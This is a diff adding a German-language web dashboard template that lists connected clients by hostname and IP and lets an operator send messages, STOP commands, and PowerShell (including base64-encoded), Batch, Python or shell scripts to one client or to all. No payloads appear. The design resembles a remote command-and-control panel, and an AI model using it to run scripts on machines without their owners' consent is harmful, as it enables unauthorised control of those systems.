@@ -1,0 +1,134 @@
+
+            <h2>📡 Verbundene Clients</h2>
+            <table class="table table-bordered table-hover">
+                <thead class="table-dark">
+                    <tr>
+                        <th>Client-ID</th>
+                        <th>Hostname</th>
+                        <th>IP-Adresse</th>
+                        <th>Aktionen</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% for client_id, client in clients.items() %}
+                    <tr>
+                        <td>{{ client_id }}</td>
+                        <td>{{ client.hostname }}</td>
+                        <td>{{ client.ip }}</td>
+                        <td>
+                            <div class="input-group mb-2">
+                                <input type="text" class="form-control message-input" placeholder="Nachricht eingeben">
+                                <button class="btn btn-primary send-btn" data-client-id="{{ client_id }}">Senden</button>
+                                <button class="btn btn-danger stop-btn" data-client-id="{{ client_id }}">STOP</button>
+                            </div>
+                            <div class="input-group">
+                                <select class="form-select script-dropdown">
+                                    <option value="">Bitte Skript auswählen...</option>
+                                </select>
+                                <select class="form-select script-type">
+                                    <option value="text">Text</option>
+                                    <option value="powershell">PowerShell</option>
+                                    <option value="powershell-base64">PowerShell (base64)</option>
+                                    <option value="bat">Batch</option>
+                                    <option value="python">Python</option>
+                                    <option value="linuxshell">Linux Shell</option>
+                                </select>
+                                <button class="btn btn-warning script-btn" data-client-id="{{ client_id }}">Skript senden</button>
+                            </div>
+                        </td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+        <!-- Globaler Nachrichtenbereich -->
+        <div class="mt-4 p-3 bg-white border rounded">
+            <h4>📢 Nachricht an alle senden</h4>
+            <div class="input-group mb-2">
+                <input type="text" id="globalMessage" class="form-control" placeholder="Nachricht für alle Clients eingeben">
+                <button class="btn btn-success" id="sendAllBtn">An alle senden</button>
+                <button class="btn btn-danger" id="stopAllBtn">STOP an alle</button>
+            </div>
+            <div class="input-group">
+				<select class="form-select" id="globalScriptDropdown">
+					<option value="">Bitte Skript auswählen...</option>
+				</select>
+				<select class="form-select" id="globalScriptType">
+					<option value="text">Text</option>
+					<option value="powershell">PowerShell</option>
+					<option value="powershell-base64">PowerShell (base64)</option>
+					<option value="bat">Batch</option>
+					<option value="python">Python</option>
+					<option value="linuxshell">Linux Shell</option>
+				</select>
+				<button class="btn btn-warning" id="sendScriptAllBtn">Skript an alle senden</button>
+			</div>
+
+        </div>
+    </div>
+
+    <!-- Modal für Erfolgsmeldung -->
+    <div class="modal fade" id="messageModal" tabindex="-1" aria-labelledby="messageModalLabel" aria-hidden="true">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="messageModalLabel">Nachricht gesendet</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Schließen"></button>
+                </div>
+                <div class="modal-body">
+                    <p id="modalMessage"></p>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">OK</button>
+                </div>
+            </div>
+        </div>
+    </div>        
+		</div>
+		
+    </main>
+</div>
+
+<script>
+    function attachButtonEvents() {
+        console.log("🔄 Event-Listener für Buttons registrieren...");
+        
+        document.getElementById("content-area").addEventListener("click", function (event) {
+            if (event.target.classList.contains("send-btn")) {
+                let clientId = event.target.getAttribute("data-client-id");
+                let message = event.target.closest("tr").querySelector(".message-input").value.trim();
+
+                if (message === "") {
+                    alert("⚠️ Bitte eine Nachricht eingeben!");
+                    return;
+                }
+
+                fetch("/send_message", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ client_id: clientId, message: message })
+                })
+                .then(response => response.json())
+                .then(data => alert("✅ Nachricht erfolgreich gesendet!"))
+                .catch(error => alert("❌ Fehler beim Senden: " + error));
+            }
+
+            if (event.target.classList.contains("stop-btn")) {
+                let clientId = event.target.getAttribute("data-client-id");
+
+                fetch("/send_message", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ client_id: clientId, message: "STOP" })
+                })
+                .then(response => response.json())
+                .then(data => alert("🛑 STOP-Nachricht gesendet!"))
+                .catch(error => alert("❌ Fehler beim Senden: " + error));
+            }
+        });
+    }
+
+    document.addEventListener("DOMContentLoaded", function () {
+        attachButtonEvents();  // WICHTIG: Event-Listener nach Laden registrieren
+        loadScripts();  // Stellt sicher, dass Skripte geladen werden
+    });
+</script>
